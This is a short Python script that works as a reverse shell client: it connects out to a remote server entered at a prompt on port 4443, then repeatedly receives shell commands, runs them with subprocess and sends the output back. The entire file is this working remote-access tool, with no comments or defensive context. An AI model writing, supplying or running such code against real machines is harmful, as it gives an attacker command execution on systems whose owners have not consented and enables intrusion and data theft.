#!/usr/bin/python3
import socket
import subprocess
sock = socket.socket()
netloc = input("remote server: ") 
sock.connect((netloc, 4443))
message = sock.recv(1024).decode()
print('🕵️ ', message)
while True:
    cmd = sock.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    response = subprocess.getoutput(cmd)
    sock.send(response.encode())
sock.close()